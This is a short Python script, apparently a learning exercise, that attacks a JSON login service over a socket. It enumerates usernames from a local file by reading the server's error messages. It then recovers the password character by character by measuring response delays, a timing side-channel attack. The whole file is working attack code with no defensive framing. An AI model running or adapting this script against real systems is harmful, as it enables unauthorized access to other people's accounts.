import sys
import socket
import io
import itertools
import json
import string
import datetime

args = sys.argv
host = args[1]
port = int(args[2])
buffer_size = 1024
login = {"login": "admin", "password": ' '}
with socket.socket() as sock:
    sock.connect((host, port))
    with io.open('c:\\Users\\Gena\\Downloads\\logins.txt', 'r') as file:
        for line in file:
            line = line.strip()
            login["login"] = line
            query = json.dumps(login).encode('utf-8')
            sock.send(query)
            response = sock.recv(buffer_size).decode('utf-8')
            response_loads = json.loads(response)
            if response_loads["result"] == "Wrong password!":
                break
    start = ""
    stop = False
    while not stop:
        for letter in itertools.chain(string.digits, string.ascii_lowercase, string.ascii_uppercase):
            login["password"] = start + letter
            query = json.dumps(login).encode('utf-8')
            sock.send(query)
            beg = datetime.datetime.now()
            response = sock.recv(buffer_size).decode('utf-8')
            response_loads = json.loads(response)
            delay = datetime.datetime.now() - beg
            if delay > datetime.timedelta(milliseconds=2):
                start += letter
                break
            if response_loads["result"] == "Connection success!":
                print(json.dumps(login))
                stop = True
                break
